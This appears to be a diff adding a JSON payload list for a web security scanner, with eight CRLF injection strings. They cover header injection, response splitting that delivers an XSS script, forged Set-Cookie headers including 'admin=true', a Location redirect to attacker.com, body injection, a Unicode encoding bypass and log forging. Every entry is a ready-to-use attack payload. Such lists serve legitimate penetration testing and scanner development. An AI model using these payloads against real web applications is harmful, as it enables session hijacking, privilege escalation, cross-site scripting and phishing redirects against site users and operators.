@@ -1,0 +1,10 @@
+[
+  {"name":"Basic CRLF","category":"CRLF","description":"Basic CRLF injection","payload":"%0d%0aHeader: injected","tags":["basic","header-injection"]},
+  {"name":"CRLF XSS via Response","category":"CRLF","description":"CRLF to inject XSS in response","payload":"%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>","tags":["xss","response-splitting"]},
+  {"name":"Cookie Injection","category":"CRLF","description":"Inject arbitrary cookie via CRLF","payload":"%0d%0aSet-Cookie: admin=true","tags":["cookie","injection"]},
+  {"name":"Redirect via CRLF","category":"CRLF","description":"Open redirect using CRLF in Location","payload":"%0d%0aLocation: https://attacker.com","tags":["redirect","crlf"]},
+  {"name":"Double CRLF","category":"CRLF","description":"Double CRLF to end headers","payload":"%0d%0a%0d%0a<html>injected body</html>","tags":["double-crlf","body-injection"]},
+  {"name":"Unicode CRLF","category":"CRLF","description":"Unicode encoded CRLF","payload":"%E5%98%8A%E5%98%8DHeader: injected","tags":["unicode","bypass","encoding"]},
+  {"name":"CRLF in Cookie Value","category":"CRLF","description":"CRLF inside cookie value","payload":"value%0d%0aSet-Cookie: malicious=1","tags":["cookie","value"]},
+  {"name":"Log Forging","category":"CRLF","description":"Forge log entries via CRLF","payload":"%0d%0a127.0.0.1 - admin [01/Jan/2024] \"GET /admin HTTP/1.1\" 200","tags":["log-forging","crlf"]}
+]
